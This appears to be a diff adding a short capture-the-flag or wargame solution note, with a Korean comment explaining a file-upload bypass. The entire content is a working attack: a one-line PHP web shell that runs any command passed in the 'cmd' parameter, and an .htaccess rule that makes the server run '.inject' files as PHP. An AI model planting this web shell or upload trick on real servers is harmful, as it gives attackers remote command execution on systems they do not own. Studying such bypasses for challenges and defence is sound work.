@@ -1,0 +1,10 @@
+go.inject
+<?php
+	system($_GET['cmd']);
+?>
+
+.htaccess
+AddType application/x-httpd-php .inject
+
+그냥 모르면 당하는 문제
+.inject파일을 php로 실행시키라는 .htaccess를 삽입후 .inject파일에 웹쉘을 사용
